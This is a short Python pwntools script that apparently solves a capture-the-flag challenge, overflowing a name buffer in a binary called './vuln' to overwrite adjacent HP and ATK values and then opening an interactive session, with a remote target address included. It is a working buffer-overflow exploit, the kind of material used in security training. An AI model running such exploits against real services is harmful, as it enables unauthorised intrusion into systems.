#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("35.200.120.35", 9002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *give_monster_name+222
        b *give_monster_name+140
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# buf for name
payload = b"A" * 0x8 * 2
# HP
payload += p64(0x600000000000006f)
# ATK
payload += p64(0x9fffffffffffffff)
p.recvuntil("Input name:")
sleep(0.5)
p.sendline(payload)

p.interactive()
